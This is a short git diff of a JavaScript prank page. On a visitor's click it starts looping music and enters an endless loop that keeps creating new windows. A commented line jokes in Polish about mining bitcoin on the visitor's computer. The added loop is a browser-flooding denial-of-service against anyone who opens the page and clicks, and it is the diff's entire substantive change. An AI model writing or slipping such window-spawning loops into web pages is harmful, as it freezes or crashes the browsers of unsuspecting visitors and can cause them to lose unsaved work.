@@ -3,9 +3,7 @@ const music = new Audio('muza.mp3');
 const main = () => {
     //console.log('szkajpurPompa')
     //console.log('jak cos to kopie wlasnie bitcoina na twoim kompie iksde')
-    while (true) {
-        new NewWindow();
-    }
+
 }
 
 addEventListener('DOMContentLoaded', () => {
@@ -15,6 +13,10 @@ addEventListener('DOMContentLoaded', () => {
 addEventListener('click', () => {
     music.loop = true;
     music.play();
+
+    while (true) {
+        new NewWindow();
+    }
 });
 
 class NewWindow {
